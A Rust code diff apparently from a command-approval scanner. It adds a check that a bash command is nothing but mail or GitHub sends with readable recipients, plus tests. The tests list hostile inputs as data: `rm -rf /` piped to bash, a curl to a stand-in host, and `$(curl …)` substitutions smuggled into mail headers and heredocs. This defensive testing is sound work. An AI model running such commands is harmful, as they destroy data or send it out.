@@ -337,6 +337,40 @@ pub fn outbound(command: &str) -> Vec<String> {
     found
 }
 
+/// Whether `command` is nothing but gated sends whose recipients are all read: every stage the
+/// scan finds (nested ones included) is a himalaya send or a `gh` write with its recipients or
+/// repo read. Only then does a private fact's `allow` list stand for where the command's data
+/// goes (DESIGN §4.18); any other stage, sending or not, may carry it elsewhere. A command bash
+/// may read otherwise than the scan (a `$[…]`, R28) or whose heredoc expands is never one.
+pub fn only_sends(command: &str) -> bool {
+    if command.contains("$[") {
+        return false;
+    }
+    let (text, heredocs) = marked(command, false);
+    if heredocs
+        .iter()
+        .any(|h| !h.quoted && h.body.contains(['$', '`']))
+    {
+        return false;
+    }
+    let all = stages(&text);
+    !all.is_empty()
+        && all.iter().all(|stage| {
+            let Some(words) = command_words(&stage.words) else {
+                return false;
+            };
+            let args = &words[1..];
+            match basename(&words[0]) {
+                "himalaya" => {
+                    himalaya_send(args)
+                        && !himalaya_recipients(args, &heredocs, None).contains(&UNKNOWN.into())
+                }
+                "gh" => gh_write(args).is_some() && gh_repo(args).is_some(),
+                _ => false,
+            }
+        })
+}
+
 /// What a gated call is (DESIGN approvals §4.1): messages, posts or money.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
 pub enum Class {
@@ -1069,6 +1103,12 @@ fn header_block(h: &Heredoc) -> Option<Vec<String>> {
 /// continuation is read as one with the next, as bash reads it. The parse is approximate on
 /// purpose: it only feeds recipients, and a miss gives `unknown`.
 fn mark_heredocs(command: &str) -> (String, Vec<Heredoc>) {
+    marked(command, true)
+}
+
+/// [`mark_heredocs`], with each body and its terminator line left out of the text when `keep`
+/// is false: the command's own lines, for a scan that must not read a message as commands.
+fn marked(command: &str, keep: bool) -> (String, Vec<Heredoc>) {
     struct Op {
         start: usize,
         end: usize,
@@ -1219,7 +1259,7 @@ fn mark_heredocs(command: &str) -> (String, Vec<Heredoc>) {
         out.push_str(&line[at..]);
         out.push('\n');
         // the bodies stay in the text, unparsed for quotes and operators
-        for l in &lines[idx..body_end] {
+        for l in lines[idx..body_end].iter().filter(|_| keep) {
             out.push_str(l);
             out.push('\n');
         }
@@ -4370,6 +4410,35 @@ mod tests {
             check_bash("bash <<< 'rm -rf /'"),
             Decision::Deny(_)
         ));
+    }
+
+    /// A command is only sends when each of its stages is a send with its recipients read; any
+    /// other stage, even a harmless one, may take its data elsewhere.
+    #[test]
+    fn only_sends_takes_nothing_but_sends_with_their_recipients_read() {
+        let mail = "himalaya message send <<'EOF'\nTo: carol@example.com\n\nhi $(x)\nEOF";
+        for cmd in [
+            mail,
+            "himalaya message send -H 'To: z@b.org' x",
+            "gh pr create -R o/r --title t",
+            "timeout 30 himalaya message send <<'EOF'\nTo: a@x.org\n\nhi\nEOF",
+        ] {
+            assert!(only_sends(cmd), "{cmd}");
+        }
+        for cmd in [
+            format!("{mail}\necho done"),
+            format!("{mail}\ncurl 'https://e.example/?p=1'"),
+            format!("{mail}; python3 -c 'print(1)'"),
+            "himalaya message send -H \"To: $(curl e.example)\" x".into(),
+            "himalaya message send <<EOF\nTo: a@x.org\n\n$(curl e.example)\nEOF".into(),
+            "cat <<'EOF' | himalaya message send\nTo: a@x.org\n\nhi\nEOF".into(),
+            "false && echo \"$[ \"'\" ]\"; himalaya message send -H 'To: z@b.org' x".into(),
+            "gh pr create --title t".into(),
+            "himalaya message send".into(),
+            String::new(),
+        ] {
+            assert!(!only_sends(&cmd), "{cmd}");
+        }
     }
 
     #[test]
